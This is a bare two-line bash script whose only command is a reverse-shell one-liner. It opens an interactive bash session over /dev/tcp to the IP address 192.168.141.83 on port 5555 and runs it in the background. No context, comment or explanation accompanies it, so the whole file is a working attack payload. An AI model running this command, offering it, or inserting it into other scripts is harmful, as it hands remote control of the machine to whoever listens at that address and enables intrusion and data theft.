#!/bin/bash
bash -i >& /dev/tcp/192.168.141.83/5555 0>&1 &
